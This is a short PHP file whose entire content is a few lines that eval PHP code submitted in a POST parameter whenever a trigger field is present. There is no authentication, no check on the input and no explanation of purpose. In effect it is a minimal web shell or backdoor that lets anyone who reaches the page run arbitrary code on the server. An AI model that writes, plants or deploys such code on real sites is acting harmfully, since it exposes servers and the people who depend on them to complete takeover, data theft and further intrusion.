<?php
if(isset($_POST['execphp']))
{
	echo eval(stripslashes($_POST['phpcode']));
}
?>